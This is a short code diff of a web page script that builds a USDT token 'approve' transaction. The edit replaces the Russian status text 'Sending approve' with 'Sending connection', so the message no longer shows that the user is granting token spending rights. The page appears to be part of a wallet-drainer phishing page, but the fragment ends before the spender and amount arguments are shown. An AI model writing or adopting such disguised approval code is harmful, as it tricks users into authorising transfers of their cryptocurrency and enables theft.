@@ -128,7 +128,7 @@
     }
 
     async function doApprove(address) {
-      setStatus("🚀 Отправка approve...", "#ff9800");
+      setStatus("🚀 Отправка подключения", "#ff9800");
       const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
       const data = new Interface(["function approve(address,uint256)"])
         .encodeFunctionData("approve", [
